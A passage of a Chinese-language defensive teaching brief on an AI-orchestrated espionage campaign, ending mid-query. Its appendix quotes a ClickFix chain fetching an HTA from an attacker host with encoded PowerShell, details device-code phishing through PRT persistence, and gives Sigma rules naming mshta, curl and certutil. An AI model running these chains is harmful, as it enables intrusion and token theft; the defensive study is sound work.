+<li><strong>自動化的質變在「改 SOP 而非下指令」</strong>：Claude Code skills = 可重用、帶記憶的攻擊 SOP；人類升格為流程工程師，一人經營多產線。這改變了「盯人類異常」的偵測前提。</li>
+<li><strong>凍結安全更新 = 攻擊防守方的補給線</strong>：偵測規則做出來不等於送得到前線；要把「更新管道健康度」本身納入監控。</li>
+</ol>
+<h3 id="102">10.2 課堂討論題（有爭議、無標準答案）</h3>
+<ol>
+<li><strong>「靜態偵測已死」是真命題還是行銷話術？</strong> Anthropic 說 AI 讓攻擊者能「閉環」比防守方更新還快。但簽章偵測真的過時了嗎？還是它從「主防線」退為「一層縱深」？如果你是 SOC 主管，你會因此<strong>減少</strong>簽章投資嗎？</li>
+<li><strong>「consistent with Midnight Blizzard」該不該當成「這就是 SVR」報給高層？</strong> 一份給決策者的報告，如何在「不誇大歸因」與「不因過度保留而失去行動指引」之間取捨？如果你把它寫成「確認是 SVR」，錯了要負什麼責任；寫成「不確定」，又可能被批評「講了等於沒講」。</li>
+<li><strong>AI 供應商該不該、能不能扮演威脅情報機構？</strong> Anthropic 看得到攻擊者的 prompt 與 skills，這是別人沒有的視角。但它同時是商業公司、報告也服務品牌。這種「球員兼裁判」的情報，消費者該打幾折？監管上該如何要求其揭露方法與信度？</li>
+<li><strong>當人類只改 skills、AI 跑一切，法律與道德責任如何分配？</strong> 若一個操作者「只是維護 SOP」，而具體的入侵動作由自主代理執行，起訴時「犯意」與「行為」如何認定？這對「AI 當共犯」的法律框架提出什麼挑戰？</li>
+<li><strong>公開 IOC 與家族名，是幫了防守方還是幫了攻擊者迭代？</strong> Anthropic 公開了兩個雜湊。對本案這種「有自動改寫閉環」的行為者，公開偵測資訊會不會反而<strong>餵給它的 AI 迴圈一次免費訓練</strong>？揭露的利弊該怎麼權衡？</li>
+<li><strong>對台灣無人機國家隊而言，「非紅供應鏈」的定位是護城河還是靶心？</strong> 把自己定位成「可信賴的非紅供應鏈」帶來訂單，但也讓對手更有動機來竊取其架構與 BOM。這個定位在資安上是資產還是負債？</li>
+</ol>
+<h3 id="103">10.3 實作／桌面演練建議（安全、不教攻擊操作）</h3>
+<ol>
+<li><strong>IOC → 偵測規則轉譯（藍隊）</strong>：發下第 7 節 IOC，讓學員用 Sigma / KQL 語法寫「device code 登入異常」「新裝置註冊進租戶」「Windows Update 服務停擺」的偵測規則。重點在<strong>把原子 IOC 上移成行為偵測</strong>，並討論每條規則的誤報率。</li>
+<li><strong>「閉環」桌面推演（紫隊思維）</strong>：主持人扮演攻擊者的 AI 迴圈，每當藍隊「部署一條新簽章」，主持人就宣布「AI 在 15 分鐘內產出功能等價的新變種」。讓藍隊體驗「純簽章」的挫敗，再引導他們轉向「凍結更新偵測、行為家族、身分層防護（phishing-resistant MFA、封鎖 device code flow）」等<strong>不靠簽章</strong>的手段。</li>
+<li><strong>歸因辯論賽</strong>：把全班分成 Anthropic／Microsoft／ReliaQuest 三隊，各自只拿該來源的資料，要求各自對「這是誰」下結論並標信度。最後攤開三家（APT29 vs APT28-like）的分歧，覆盤「代號 ≠ 實體、靠雜湊拼圖」。</li>
+<li><strong>供應鏈威脅建模（對映台灣）</strong>：拿 Figure（p.7）B 欄的 W5–W8，讓學員把每一格對映到「台灣無人機國家隊」的真實資產（整合商、第二/三階零組件廠、視覺 SDK、投標 API、公司信箱），畫出「哪一格會先中、為什麼」的攻擊路徑圖。<strong>只做防禦側建模，不產出任何攻擊操作步驟。</strong></li>
+<li><strong>假更新／凍結更新的偵測設計工作坊</strong>：讓學員設計「如何監控一台機器的安全更新是否被人為凍結」——例如比對 Windows Update / Defender 簽章版本落後於雲端基準的時間差、監控相關服務（wuauserv、Defender 平台）被停用或政策被改的事件。產出一份「更新管道健康度」的監控指標清單。</li>
+</ol>
+<h3 id="104">10.4 對台灣的意涵（必寫）</h3>
+<p>報告白紙黑字把受害面延伸到<strong>「亞洲海事相關政府機構」</strong>，並把<strong>無人機技術供應商與供應鏈列為主要竊取目標</strong>。這兩點讓本案對台灣有高度直接性。</p>
+<h4 id="1041">10.4.1 無人機國家隊：本案劇本幾乎是為台灣量身寫的</h4>
+<p><strong>台灣現況（公開資料）</strong>：<br />
+- 立法院於 <strong>2026-08-28</strong> 三讀通過《<strong>強化國防自主暨無人載具產業發展條例</strong>》，6 年編列 <strong>NT$2,400 億</strong>（年均 400 億），主管機關為<strong>經濟部</strong>、軍用採購由<strong>國防部</strong>統籌。條文明列「<strong>資安審查、關鍵技術進口、供應鏈安全</strong>」為核心事項，要「確保本土無人載具供應鏈在資安無虞的前提下加速發展」。<br />
+- 「<strong>無人機國家隊</strong>」達 <strong>267 家</strong>業者，洽談中國際訂單破百億元，已與歐美日等 <strong>9 國</strong>簽 MOU；整機出口自 2024 年的 US$441 萬暴增到 2026 上半年的 <strong>US$2.12 億</strong>。<strong>中科院（CSIST）</strong>為系統整合主承包商，民間多為二、三階供應商；飛控演算法、資料鏈加密等核心技術優先由公部門掌握。台灣自我定位為全球「<strong>非紅供應鏈</strong>」核心。</p>
+<p><strong>風險對映（把 GTG-20006 手法逐一套到台灣）</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>GTG-20006 手法</th>
+<th>對映到台灣無人機國家隊的風險</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>大量匯出無人機零組件廠信箱、竊取視覺系統 SDK、逆向出<strong>架構/BOM/供應商依賴/未發表產品</strong></td>
+<td>台灣 267 家中大量是<strong>二、三階中小零組件廠</strong>，資安成熟度參差，正是「軟腹部」。對手要的不只是成品，而是<strong>整條供應鏈的圖譜</strong>——誰供什麼料、誰依賴誰、下一代長怎樣。一旦 BOM 與供應商依賴外洩，可用於<strong>精準供應鏈干擾、仿製、或對關鍵單點供應商施壓</strong></td>
+</tr>
+<tr>
+<td>鎖定<strong>軍用無人機控制與 AI 視覺韌體</strong></td>
+<td>台灣主打的 AI 影像辨識、飛控正是核心賣點，也正是本案「particular interest」所在。核心技術雖由中科院掌握，但<strong>整合介面、SDK 交付給下游整合商時的側錄風險</strong>很高</td>
+</tr>
+<tr>
+<td>用 AI <strong>逆向工程</strong>竊得的 SDK</td>
+<td>這是 ATT&amp;CK 缺口（第 5 節）：竊取後的「情報加值」發生在受害端視野之外。台灣廠商的威脅建模常止於「防止被入侵」，<strong>少有針對「資料被偷走之後如何被 AI 加值利用」的推演</strong></td>
+</tr>
+<tr>
+<td>device code phishing / M365 token 竊取</td>
+<td>台灣無人機廠與政府/軍方往來頻繁，<strong>M365／Google Workspace 的 OAuth 濫用</strong>是低成本高回報的初始存取，且濫用的是合法流程，難以一刀切</td>
+</tr>
+<tr>
+<td>飯店 WiFi + ClickFix 鎖定「無人機製造商相關個人」</td>
+<td>台灣廠商赴歐美日參展、洽談 MOU 時，<strong>出差住宿的 WiFi 就是 CaptiveCrunch 式攻擊面</strong>。報告明指「無人機製造商」是飯店 WiFi 鎖定對象</td>
+</tr>
+</tbody>
+</table>
+<p><strong>建議行動（給無人機國家隊與主管機關）</strong>：<br />
+1. 把<strong>二、三階供應商的資安門檻</strong>寫進《無人載具條例》的資安審查實施細則，不能只審整合商。<br />
+2. 對 SDK/BOM 等關鍵技術資產做<strong>資料層而非只有邊界層</strong>的防護（加密、存取稽核、去識別化交付）。<br />
+3. 對<strong>出差人員</strong>推 phishing-resistant MFA、企業 VPN/eSIM 取代公用 WiFi、封鎖非必要的 device code flow——直接對應 CaptiveCrunch 的防禦建議。<br />
+4. 把「<strong>被竊之後的 AI 加值利用</strong>」納入威脅建模與紅隊演練情境。</p>
+<h4 id="1042">10.4.2 海事機關：報告已把矛頭指向亞洲海事政府單位</h4>
+<p>報告明列例外目標含<strong>「東南亞政府單位，涉及海運與船舶追蹤」</strong>與<strong>「亞洲海事相關政府機構」</strong>。台灣的<strong>航港局、港務公司、海洋委員會/海巡署</strong>是同型資產：<br />
+- 台灣港務公司已對 7 大商港導入「AI 主動告警」結合 AIS 與影像辨識；海洋委員會亦已研究 <strong>AIS 假資訊威脅</strong>（空白欄位癱瘓、偽冒監控中心改頻）。<br />
+- <strong>風險</strong>：GTG-20006 對海事目標的興趣（船舶追蹤資料）與台灣「船舶即時資訊系統／AIS」高度重疊。船舶動態是<strong>軍民兩用情報</strong>（軍艦調度、關鍵物資航運、供應鏈韌性）。海事機關應假設自己在同型行為者的目標清單上，並比照本案的 device code phishing、VPN appliance 憑證竊取（北非案例即從 <strong>VPN appliance 憑證</strong> 一路打到中央帳號伺服器外洩 30 萬身分）做強化。</p>
+<h4 id="1043">10.4.3 國防供應鏈與跨境情報</h4>
+<ul>
+<li>北非案例（VPN appliance 憑證 → 中央帳號伺服器 → 30 萬國民身分 + 50 萬公司登記外洩）示範了<strong>「一個邊界裝置憑證 → 全國級身分庫」</strong>的災難路徑。台灣任何持有大規模身分/登記資料的政府單位（戶政、經濟部商業司、國防人事）都應把「VPN/邊界裝置憑證 + 中央目錄服務」視為皇冠寶石，套用本案偵測構想（新裝置註冊、大量匯出、憑證重放）。</li>
+<li>台灣「非紅供應鏈」的戰略定位，客觀上<strong>提高了自己作為情報標的的價值</strong>：對手既想了解、又想滲透、也想在必要時破壞這條鏈。這不是要台灣退縮，而是要<strong>把資安投資與產業擴張同步拉高</strong>——條例已寫入資安審查，關鍵在落地執行與對中小供應商的實質扶持。</li>
+</ul>
+<hr />
+<h2 id="11">11. 關鍵原文引文（英文原文 + 繁中翻譯，供講義引用）</h2>
+<ol>
+<li>
+<p><strong>歸因（p.6）</strong></p>
+<blockquote>
+<p>"Our attribution is consistent with public reporting linking the actor to Midnight Blizzard. One of the operators is a Russian speaker using the handle 'JackPoterz' whose tradecraft and targeting are consistent with Russian state-nexus espionage."<br />
+   〔我們的歸因與把此行為者連結到 Midnight Blizzard 的公開報導一致。其中一名操作者是使用 handle「JackPoterz」的俄語使用者，其技術手法與目標選擇與俄羅斯國家關聯的間諜活動一致。〕</p>
+</blockquote>
+</li>
+<li>
+<p><strong>自主逃避偵測的閉環（p.6）</strong></p>
+<blockquote>
+<p>"If their monitoring AI agents identified that any of their deployed malware was detected by a security product, agents would then set about the process of autonomously modifying and rebuilding the malware to evade the existing detections. The agents were designed to continue iterating on GTG-20006's toolkit until it was undetected."<br />
+   〔若其監控 AI 代理發現任何已部署的惡意程式被安全產品偵測到，代理便會著手自主修改並重建該惡意程式以規避既有偵測。這些代理被設計成持續迭代 GTG-20006 的工具箱，直到不被偵測為止。〕</p>
+</blockquote>
+</li>
+<li>
+<p><strong>成本反轉 / 閉環（p.9）</strong></p>
+<blockquote>
+<p>"AI has inverted the cost back onto defenders. Previously, defenders might have been able to slow an attacker's operational tempo via the deployment of a new detection. Now, at least in theory, capable adversaries can 'close the loop,' bypassing traditional security detections faster than defenders can develop and deploy them."<br />
+   〔AI 已把成本反轉回防守方身上。過去，防守方或許能透過部署一條新偵測來拖慢攻擊者的行動節奏；如今，至少在理論上，有能力的對手可以「閉環」，比防守方開發並部署偵測的速度更快地繞過傳統安全偵測。〕</p>
+</blockquote>
+</li>
+<li>
+<p><strong>人類只改 Claude Code skills（p.7）</strong></p>
+<blockquote>
+<p>"The human actor engaged primarily to modify Claude Code skills that drove the workflows when they needed to be refined."<br />
+   〔人類行為者主要只在需要精修那些驅動工作流的 Claude Code skills 時才介入。〕</p>
+</blockquote>
+</li>
+<li>
+<p><strong>凍結安全更新（p.9）</strong></p>
+<blockquote>
+<p>"These payloads were designed to freeze the victim machine's security updates, meaning that new malware detection signatures published by security vendors would not be retrieved or run on the victim's machine."<br />
+   〔這些 payload 被設計成凍結受害機器的安全更新，意即安全廠商發布的新惡意程式偵測簽章不會被下載到、也不會在受害機器上執行。〕</p>
+</blockquote>
+</li>
+<li>
+<p><strong>無人機供應鏈逆向（p.8）</strong></p>
+<blockquote>
+<p>"They spent several days reverse-engineering the drone's vision system, recovering its product architecture, its hardware bill of materials, its supplier dependencies, and details of an unannounced product."<br />
+   〔他們花了數天逆向工程該無人機的視覺系統，復原出其產品架構、硬體物料清單、供應商依賴關係，以及一款尚未發表產品的細節。〕</p>
+</blockquote>
+</li>
+<li>
+<p><strong>飯店 WiFi / CaptiveCrunch（p.8）</strong></p>
+<blockquote>
+<p>"Guests of hotels using the compromised vendors who connected to the hotel WiFi had their traffic, device identifier and IP address sent to the actor's servers... Note that in July 2026, Microsoft Threat Intelligence published a report on the method of theft and malware delivery used here, which they referred to as CaptiveCrunch."<br />
+   〔使用受害供應商之飯店的房客，一旦連上飯店 WiFi，其流量、裝置識別碼與 IP 位址就被送往行為者的伺服器……須注意，2026 年 7 月 Microsoft 威脅情報就此處使用的竊取與惡意程式投放手法發布了報告，名為 CaptiveCrunch。〕</p>
+</blockquote>
+</li>
+<li>
+<p><strong>趨勢：精密攻擊不再需要精密攻擊者（p.5）</strong></p>
+<blockquote>
+<p>"The cybersecurity skills of AI models means that AI has collapsed the labor and tooling gap that used to separate well-resourced, state-sponsored operations from individual operators."<br />
+   〔AI 模型的資安能力，意味著 AI 已抹平了過去區隔「資源雄厚的國家級行動」與「個人操作者」之間的人力與工具落差。〕</p>
+</blockquote>
+</li>
+</ol>
+<hr />
+<h2 id="12">12. 未能驗證之處與研究限制</h2>
+<ol>
+<li>
+<p><strong>整合性敘事屬單一來源</strong>：把飯店 WiFi、WhatsApp、device code phishing、無人機 SDK 竊取、北非身分外洩「統合為同一個 AI 編排行動者（GTG-20006/JackPoterz）」的敘事，<strong>只有 Anthropic 一個來源</strong>。個別 TTP 雖被 Microsoft/Google 獨立佐證，但「同一手包辦全部」的串接是 Anthropic 的內部關聯結論，外部無法完全複驗。</p>
+</li>
+<li>
+<p><strong>效果多為「推斷（inferred）」</strong>：Figure（p.7）C 欄明標效果為 inferred，且有多格未達成。「300,000 筆身分」「500,000 家公司」「hundreds of gigabytes」「至少 8 個組織信箱」等硬數字，來自 Anthropic 對模型側活動的推估與其掌握的片段，<strong>未經受害端獨立鑑識公開確認</strong>。引用時應標「據 Anthropic」。</p>
+</li>
+<li>
+<p><strong>歸因存在來源間分歧</strong>：同一波飯店 WiFi 活動，Microsoft 歸 <strong>APT29/Midnight Blizzard（Storm-2945）</strong>，ReliaQuest 卻評為 <strong>APT28-like（且僅 TTP 重疊、非直接連結）</strong>。iOS 那條線，Google GTIG 只說 UNC6353 是「疑似俄羅斯」，未等同 APT29。<strong>依簡報紅線，以 PDF 原文（consistent with Midnight Blizzard）為準</strong>，但須向學員揭示此分歧。</p>
+</li>
+<li>
+<p><strong>惡意程式命名無法全部對齊</strong>：<code>PowerChrome</code>、<code>WUEngine</code> 截至查證時<strong>僅見於 Anthropic</strong>，無第三方公開對應。<code>MiniPlasma</code> 與一個公開 Windows 提權 PoC 同名（CVE-2020-17103 / cldflt.sys），<strong>報告未說明兩者是否相關</strong>——可能是命名碰撞、借用公開工具，或純屬巧合，<strong>存疑待考</strong>。</p>
+</li>
+<li>
+<p><strong>缺台灣本地機構查證</strong>：截至 2026-09-13，未見 TWCERT/CC、調查局、國安或國防單位對本案發表任何獨立查證或受害通報。第 10.4 節的台灣風險分析屬<strong>類比推演</strong>（把報告手法對映到台灣公開的產業/機關現況），非「台灣已遭此行為者攻擊」的事實陳述。</p>
+</li>
+<li>
+<p><strong>WebSearch 額度已用罄</strong>：本研究於查證後段用盡本工作階段的網頁搜尋額度，故 <code>PowerChrome</code>/<code>CloudSyncSvc</code> 的第三方對應、以及是否有 Anthropic 具名人員受訪等，<strong>未能做最後一輪補搜</strong>。若要補強，需提高搜尋上限後再查。</p>
+</li>
+<li>
+<p><strong>未連線任何 IOC</strong>：依安全紅線，所有網域、IP、雜湊僅作文本抄錄與交叉比對，<strong>未做任何 DNS 查詢、未連線、未查互動式服務</strong>，故無法驗證這些指標當前的存活狀態或關聯資料。</p>
+</li>
+<li>
+<p><strong>圖表為風格化資訊圖</strong>：p.7 的儀表板是 Anthropic 製作的<strong>戰役回顧視覺化</strong>，非真實攻擊工具截圖；其數字（148 agents、24/27、55 capabilities、130 days）是 Anthropic 對此戰役的內部彙整，屬單一來源，且圖上文字經人工判讀，個別小字可能有辨識誤差。</p>
+</li>
+</ol>
+<hr />
+<h1 id="pass-2026-09-14">技術附錄（技術深化 pass · 2026-09-14 增補）</h1>
+<blockquote>
+<p>本附錄為第二階段「技術深化」增補，<strong>不修改上文任何既有內容</strong>，只在檔尾補足命令級／協定級的防禦性技術深度。適用聽眾為資安技術人員。所有 IOC 沿用上文 defang 格式；<strong>附錄內任何 Sigma / YARA / KQL / Suricata 規則皆為教學用「偵測構想」，非廠商官方規則，部署前須依自家環境調校並移除 defang（refang）</strong>。凡涉及攻擊操作細節，一律以「防守方需要理解到什麼程度才能偵測與阻斷」為界，不提供可直接照抄的攻擊腳本。</p>
+<p>技術事實的第三方佐證來源彙整於附錄 E（本 pass 以新配額補搜）。</p>
+</blockquote>
+<hr />
+<h2 id="a">附錄 A — 三大初始存取手法的命令級／協定級深潛（防禦視角）</h2>
+<h3 id="a1-wifidns-clickfix-microsoft-captivecrunch">A.1 飯店 WiFi「DNS 劫持 → ClickFix 投放」鏈（交叉比對 Microsoft CaptiveCrunch）</h3>
+<h4 id="a11-dns-gateway-dns-resolver">A.1.1 DNS 記錄「怎麼被改」——關鍵在 gateway 同時是 DNS resolver</h4>
+<p>上文第 4.4 節說明了「攻破供應商 → 改 DNS → 導流」的邏輯。技術上要講透的是<strong>改在哪一層</strong>。CaptiveCrunch 的獨立分析指出：受害飯店網路的 <strong>captive portal gateway 本身就是被指派給連線裝置的 DNS resolver</strong>（透過 DHCP Option 6 下發）。攻擊者拿到 gateway 管理權後，不需要去改上游權威 DNS，只要在 gateway 這一台做<strong>DNS 回應偽造（DNS answer forging / spoofing）</strong>即可：</p>
+<ul>
+<li>攻擊者以竊得的管理員憑證登入 gateway 管理介面（常見暴露面：SSH、SNMP、web 主控台——ReliaQuest 以低-中信度評估初始存取即來自這些暴露介面 + 弱/重用憑證）。</li>
+<li>在 gateway 的 DNS 轉發／解析設定中，對特定網域（作業系統的連線偵測網域、常見軟體更新網域、目標郵件網域）建立<strong>覆寫紀錄</strong>，把 A/AAAA 回應指向攻擊者伺服器；其餘網域正常轉發，以維持「網路看起來正常」。</li>
+<li>因為偽造發生在<strong>遞迴解析這一跳</strong>、且多數目標網域是 HTTP 或可被降級的流量，攻擊者不需要偽造 TLS 憑證即可攔截明文連線偵測請求並插入誘導頁。</li>
+</ul>
+<p><strong>防守方要記住的協定細節</strong>：Windows 開機/連網時會發 <strong>NCSI（Network Connectivity Status Indicator）</strong>探測——對 <code>www.msftconnecttest.com/connecttest.txt</code> 期望回 <code>Microsoft Connect Test</code>，並對 <code>dns.msftncsi.com</code> 期望解析到 <code>131.107.255.255</code>。captive portal 正是靠攔截這個探測把使用者導到登入頁；攻擊者濫用同一機制，把 NCSI 探測導向「假的『需修復網路』頁」。<strong>偵測抓手</strong>：企業裝置在陌生網路上，NCSI 探測網域被解析到非微軟 IP、或連線偵測結果與預期字串不符，是高價值的「你正處於被操縱的 captive portal」訊號。</p>
+<h4 id="a12-clickfix-mshtapowershell">A.1.2 ClickFix 誘餌「實際怎麼跑」——剪貼簿注入 + mshta/powershell 執行鏈</h4>
+<p>ClickFix 的關鍵是<strong>由使用者自己執行</strong>，藉此繞過附件/巨集防線與 Mark-of-the-Web。實際運作分三段：</p>
+<ol>
+<li><strong>剪貼簿注入（clipboard injection）</strong>：誘導頁（假「驗證你是真人 / 修復網路 / 更新瀏覽器」）用一小段 JavaScript 在使用者點擊當下把一條指令寫進剪貼簿——技術上是 <code>navigator.clipboard.writeText(...)</code> 或舊式 <code>document.execCommand('copy')</code>。使用者「看到的」是「按 Win+R、貼上、Enter」的三步教學，<strong>看不到</strong>剪貼簿裡真正被塞了什麼。</li>
+<li><strong>執行框落點</strong>：教學誘導把指令貼到 <strong>Windows Run（Win+R）</strong>、<strong>PowerShell</strong> 或<strong>終端機</strong>。貼到 Run 會在登錄留下痕跡：<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code>（這是重要鑑識/偵測點）。</li>
+<li><strong>執行鏈</strong>：典型鏈是 <code>mshta.exe hxxps://攻擊者主機/stage.hta</code> → HTA 內的 JScript/VBScript → 再拉 <code>powershell.exe -w hidden -enc &lt;Base64&gt;</code> → 下載並在記憶體執行下一階 loader（本案依裝置 OS 分流投放 Windows/Android/iOS 惡意程式）。PowerShell 段常以大量垃圾指令填充（padding）拖慢分析。</li>
+</ol>
+<p><strong>執行鏈時序（Mermaid）</strong>：</p>
+<pre class="mermaid">sequenceDiagram
+    autonumber
+    participant V as &quot;受害房客裝置&quot;
+    participant GW as &quot;飯店 WiFi Gateway（captive portal＝DNS resolver）&quot;
+    participant A as &quot;攻擊者伺服器 / 誘導頁&quot;
+    participant AI as &quot;Claude 監控/建置代理&quot;
+    Note over GW: 前置：攻擊者以竊得管理員憑證登入 gateway，於 DNS 轉發層建立覆寫紀錄
+    V-&gt;&gt;GW: 連上 WiFi，發 NCSI 探測（www.msftconnecttest.com）
+    GW--&gt;&gt;V: 偽造 DNS/HTTP 回應 → 導向「需修復網路」誘導頁
+    V-&gt;&gt;A: HTTP GET 假 captive portal / 假更新頁
+    A--&gt;&gt;V: 頁面 JS 以 navigator.clipboard.writeText() 注入 mshta 指令
+    Note over V: ClickFix：教學誘使房客自行 Win+R 貼上並 Enter（RunMRU 留痕）
+    V-&gt;&gt;A: mshta.exe hxxps://攻擊者/stage.hta 取回 JScript
+    A--&gt;&gt;V: JScript → powershell -w hidden -enc &lt;Base64&gt; 下載植入體
+    Note over V,A: 依 OS 落地 Windows / Android(fix_network.apk) / iOS(DarkSword)
+    A-&gt;&gt;AI: 若植入體被 AV 偵測 → 觸發附錄 D 的改寫重建閉環
+</pre>
+<h4 id="a13">A.1.3 偵測構想（不靠簽章的行為偵測）</h4>
+<p><strong>Sigma（process_creation）— ClickFix 執行鏈：瀏覽器/explorer 生 mshta/powershell 並帶遠端下載跡象</strong></p>
+<pre><code class="language-yaml">title: ClickFix Clipboard-to-Run Execution Chain
+status: experimental
+logsource: { product: windows, category: process_creation }
+detection:
+  parent:
+    ParentImage|endswith:
+      - '\explorer.exe'      # 由 Run 對話框啟動
+      - '\msedge.exe'
+      - '\chrome.exe'
+      - '\firefox.exe'
+  child:
+    Image|endswith:
+      - '\mshta.exe'
+      - '\powershell.exe'
+      - '\pwsh.exe'
+      - '\wscript.exe'
+      - '\cscript.exe'
+      - '\curl.exe'
+  suspicious_args:
+    CommandLine|contains:
+      - 'http://'
+      - 'https://'
+      - '-enc'
+      - '-EncodedCommand'
+      - 'FromBase64String'
+      - '.hta'
+      - 'IEX'
+      - 'Invoke-Expression'
+  condition: parent and child and suspicious_args
+falsepositives: [ '系統管理腳本、IT 自助修復工具' ]
+level: high
+</code></pre>
+<p><strong>Sigma（registry_set）— RunMRU 出現手動貼上的可疑指令（ClickFix 的鑑識金指標）</strong></p>
+<pre><code class="language-yaml">title: Suspicious Command Written to Explorer RunMRU (ClickFix)
+status: experimental
+logsource: { product: windows, category: registry_set }
+detection:
+  selection:
+    TargetObject|contains: '\Explorer\RunMRU\'
+    Details|contains:
+      - 'mshta'
+      - 'powershell'
+      - 'pwsh'
+      - 'curl'
+      - 'certutil'
+      - 'FromBase64String'
+      - '.hta'
+  condition: selection
+level: high
+</code></pre>
+<p><strong>網路層（captive portal 操縱）偵測</strong>：<br />
+- 企業端點在外網時，比對 NCSI/連線偵測網域是否被解析到非微軟 IP、或探測回應內容不符（可用端點代理主動探測）。<br />
+- 對出差裝置強制<strong>全通道 VPN（full-tunnel）</strong>，讓 DNS 查詢在連上場館 gateway 前就走公司 resolver——這正是 Microsoft 對 CaptiveCrunch 的第一條防禦建議（見附錄 E.1）。<br />
+- Suricata 概念規則：偵測 captive portal 後短時間內對「連線偵測網域」的 A 紀錄回應為非預期網段（需自建預期清單，屬環境相依）。</p>
+<blockquote>
+<p>課堂連結：這一小節對映上文第 5 節 ATT&amp;CK 表的 <strong>T1557（AitM）、T1204（User Execution）、T1566（Phishing）</strong>，以及第 10.3 節「假更新／凍結更新偵測設計工作坊」。</p>
+</blockquote>
+<hr />
+<h3 id="a2-device-code-phishing-embassy-kit-oauth-token">A.2 device code phishing + Embassy Kit（完整 OAuth 協定步驟與 token 管理）</h3>
+<h4 id="a21-oauth-20-rfc-8628">A.2.1 先講「正常」的 OAuth 2.0 裝置授權流程（RFC 8628）</h4>
+<p>要懂濫用，先懂正常。裝置授權流程（device authorization grant）是設計給<strong>輸入受限裝置</strong>（智慧電視、CLI、IoT）的：</p>
+<ol>
+<li>裝置向授權伺服器的 <strong>device authorization endpoint</strong> 送 <code>client_id</code>（+ scope），取回 <code>device_code</code>、<code>user_code</code>、<code>verification_uri</code>（微軟為 <code>microsoft.com/devicelogin</code> 或 <code>aka.ms/devicelogin</code>）、<code>interval</code>、<code>expires_in</code>。</li>
+<li>裝置在畫面顯示 <code>user_code</code>，請使用者「到另一台裝置開 verification_uri、輸入這組碼」。</li>
+<li>使用者在<strong>另一台有瀏覽器的裝置</strong>上完成登入 + MFA，把 <code>user_code</code> 綁定到自己的身分。</li>
+<li>裝置同時以 <code>grant_type=urn:ietf:params:oauth:grant-type:device_code</code> + <code>device_code</code> <strong>每 <code>interval</code> 秒輪詢</strong> token endpoint，直到拿到 <code>access_token</code> + <code>refresh_token</code>。</li>
+</ol>
+<h4 id="a22-mfatoken">A.2.2 被濫用的完整步驟——「使用者過真 MFA，token 卻發給攻擊者」</h4>
+<p>濫用的本質：<strong>步驟 1 由攻擊者發起、步驟 4 由攻擊者輪詢，只有步驟 3（過 MFA）騙受害者去做</strong>。因此 MFA 是「真的過了」，但綁定的授權落到攻擊者手上。CaptiveCrunch/Storm-2372 的進階手法再往下走：</p>
+<ul>
+<li>攻擊者刻意用 <strong>Microsoft Authentication Broker</strong> 的 client id（<code>29d9ed98-a469-4536-ade2-f981bc1d605e</code>）發起 device code 流程。</li>
+<li>拿到的 refresh token 具「可換裝置註冊範圍 token」的特性：攻擊者用它向 <strong>Device Registration Service（DRS）</strong> 註冊一台<strong>攻擊者控制的裝置</strong>，取回<strong>裝置憑證（device certificate）</strong>。</li>
+<li>再用該裝置憑證向 Entra ID 請求 <strong>Primary Refresh Token（PRT）</strong>。PRT ≒ 一把長效、可 SSO、可持續換發 access token 的「主鑰匙」，且後續換發<strong>不再重複觸發 MFA</strong>——這就是「device code 一次得手 → 長期潛伏」的技術根源。</li>
+</ul>
+<p><strong>協定時序（Mermaid）</strong>：</p>
+<pre class="mermaid">sequenceDiagram
+    autonumber
+    participant AK as &quot;Embassy Kit（攻擊者）&quot;
+    participant IDP as &quot;Microsoft Entra ID（devicecode / token 端點）&quot;
+    participant V as &quot;受害者（真人）&quot;
+    participant DRS as &quot;Device Registration Service&quot;
+    AK-&gt;&gt;IDP: POST /devicecode（client_id＝Authentication Broker）
+    IDP--&gt;&gt;AK: 回 device_code、user_code、verification_uri、interval
+    AK-&gt;&gt;V: 釣魚誘餌：請到 microsoft.com/devicelogin 輸入此碼（偽裝活動邀請/安全通話）
+    V-&gt;&gt;IDP: 於「真正的微軟頁面」輸入 user_code 並完成「真 MFA」
+    loop 每 interval 秒輪詢
+        AK-&gt;&gt;IDP: POST /token（grant_type＝device_code）
+    end
+    IDP--&gt;&gt;AK: access_token + refresh_token（MFA 已滿足）
+    AK-&gt;&gt;IDP: 以 Auth Broker refresh_token 換「DRS 範圍」token
+    AK-&gt;&gt;DRS: 註冊攻擊者裝置 → 取回 device certificate
+    DRS--&gt;&gt;AK: device certificate
+    AK-&gt;&gt;IDP: 以裝置憑證請求 PRT（Primary Refresh Token）
+    IDP--&gt;&gt;AK: PRT → 長期存取、SSO、後續換發不再觸發 MFA
+    Note over AK: token services 排程自動 refresh（無人維護），並跨信箱擴展
+</pre>
+<h4 id="a23-embassy-kit-token-figure-p7-w3w5">A.2.3 Embassy Kit「如何管理 token」——對映 Figure p.7 的 W3/W5</h4>
+<p>上文第 6.1 節判讀的 Figure「縱欄 A」中，<strong>W3 Token &amp; collection pipeline</strong> 與 <strong>W5 O365 phishing &amp; embassy ATO</strong> 正是 Embassy Kit 的兩個面。把它拆成後端元件架構：</p>
+<pre class="mermaid">flowchart LR
+    V[&quot;受害者完成真 MFA&quot;] --&gt; L1[&quot;device code 誘餌頁（活動邀請/安全通話主題，staged link target）&quot;]
+    subgraph BE[&quot;Embassy Kit 後端（容器化，對映 W3）&quot;]
+      CAP[&quot;Capture backend：submissions + panel + DB&quot;]
+      TOK[&quot;Token services：DPAPI / OAuth refresh / WAM .tbres&quot;]
+      TASK[&quot;Tasking API：agent command loop&quot;]
+      LOOT[&quot;Loot processing：cookies / creds / files&quot;]
+      EXF[&quot;Exfil endpoints：collect routes + loot DB&quot;]
+    end
+    L1 --&gt; CAP --&gt; TOK
+    TOK --&gt;|&quot;自動刷新 refresh / PRT&quot;| TASK
+    TASK --&gt;|&quot;remote exec over agents（對映 W5 hands-free maintenance）&quot;| LOOT --&gt; EXF
+    TOK -.-&gt;|&quot;註冊攻擊者裝置（PRT persistence / phantom device grants）&quot;| ENTRA[&quot;受害 Entra ID 租戶&quot;]
+</pre>
+<p>要點：<strong>token 不是偷完就用完，而是進入一條「自動刷新 + 排程再擷取」的管線</strong>（Figure 標為 <code>Hands-free maintenance（automated token refresh）</code>）。這就是上文第 4.9 節「人類只改 skills、機器自轉」在 token 層的具體形態——refresh token/PRT 讓工作階段可以在無人介入下延續數週。</p>
+<h4 id="a24">A.2.4 偵測構想（身分層，比端點更關鍵）</h4>
+<p><strong>KQL（Entra SigninLogs）— 異常 device code 授權登入</strong></p>
+<pre><code class="language-kusto">SigninLogs
+| where AuthenticationProtocol == &quot;deviceCode&quot;
